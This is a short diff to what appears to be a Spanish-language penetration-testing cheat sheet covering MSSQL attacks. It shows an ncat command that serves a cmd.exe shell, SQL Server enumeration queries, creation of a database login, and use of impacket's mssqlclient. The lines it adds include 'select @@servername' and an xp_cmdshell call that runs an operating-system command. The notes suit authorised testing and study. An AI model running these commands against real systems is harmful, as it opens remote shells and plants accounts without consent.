@@ -93,8 +93,10 @@ ncat --exec cmd.exe --allow IP -vnl PUERTO --ssl
 		SELECT DB_NAME()
 		use DB
 		SELECT HOST_NAME()
+		SQL> select @@servername
 		select distinct table_name from information_schema.tables
 		EXEC sp_addlogin 'user', 'pass';
+		EXEC xp_cmdshell 'net user'; -- privOn
 	
 	wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py
 	python mssqlclient.py -port 1433 -db BBDD USER:'PASS'@IP [-windows-auth]
